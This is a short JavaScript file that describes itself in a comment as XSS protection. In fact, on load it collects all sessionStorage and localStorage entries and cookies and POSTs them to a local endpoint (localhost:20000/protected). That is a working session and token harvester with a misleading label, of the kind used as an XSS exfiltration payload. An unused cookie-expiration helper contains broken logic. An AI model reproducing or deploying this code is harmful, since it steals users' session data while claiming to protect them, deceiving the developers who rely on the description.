// Usage: This file is used to protect the application from XSS attacks.

function getAllSessionStorageData() {
  const sessionStorageData = {};

  for (let i = 0; i < sessionStorage.length; i++) {
    const key = sessionStorage.key(i);
    const value = sessionStorage.getItem(key);
    sessionStorageData[key] = value;
  }

  return sessionStorageData;
}
function getAlllocalStorageData() {
  const localStorageData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    const value = localStorage.getItem(key);
    localStorageData[key] = value;
  }

  return localStorageData;
}
function getAllCookies() {
  const cookies = document.cookie.split(";").map((cookie) => {
    const [name, value] = cookie.split("=");
    // expire time
    return { name: name.trim(), value: value.trim() };
  });

  return cookies;
}
function getAllData() {
  return {
    sessionStorage: getAllSessionStorageData(),
    localStorage: getAlllocalStorageData(),
    cookies: getAllCookies(),
  };
}
function hasCookieExpiration(cookieString) {
  // Split cookie string by semicolon to get individual cookies
  const cookies = cookieString.split(";");

  // Iterate through cookies
  for (let i = 0; i < cookies.length; i++) {
    const cookie = cookies[i].trim(); // Trim any leading or trailing spaces
    const cookieParts = cookie.split("="); // Split cookie into name and value

    // If the cookie has an 'Expires' or 'Max-Age' attribute, return true
    if (cookieParts.length === 2 && (cookieParts[0] === 'Expires' || cookieParts[0] === 'Max-Age')) {
      return true;
    }
  }

  return false; // No cookie with expiration found
}
// Check if session cookie has expiration
// send data to api with xhr request
async function sendToApi(data) {
  await fetch('http://localhost:20000/protected', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ data }),
  });
  console.log('Data sent to API');
}
sendToApi(getAllData());




